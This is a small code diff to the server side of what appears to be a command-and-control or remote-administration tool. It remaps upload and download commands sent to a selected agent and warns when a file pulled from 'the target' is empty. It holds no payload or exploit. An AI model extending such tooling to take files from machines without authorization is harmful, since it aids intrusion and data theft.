@@ -129,7 +129,14 @@ class Server:
                         self.commands[command_name]['function'](' '.join(args))
                     elif command_name in self.agent_commands:
                         if self.is_agent_selected():
-                            self.agent_commands[command_name]['function'](' '.join(args))
+                            # Client download when server upload
+                            if command_name == 'upload':
+                                self.agent_commands["download"]['function'](' '.join(args))
+                            # Client upload when server download
+                            elif command_name == 'download':
+                                self.agent_commands["upload"]['function'](' '.join(args))
+                            else:
+                                self.agent_commands[command_name]['function'](' '.join(args))
                     else:
                         print(f"Unknown command: {command_name}")
             except KeyboardInterrupt:
@@ -235,6 +242,8 @@ class Server:
                 while True:
                     data = self.current_agent.sock.recv(1024)
                     if data == SIG_EOF or not data:
+                        if file_length == 0:
+                            print(f"WARNING: {file_path} is empty")
                         break
                     if data == FILE_NOT_FOUND:
                         print(f"ERROR: {file_path} not found on the target.")
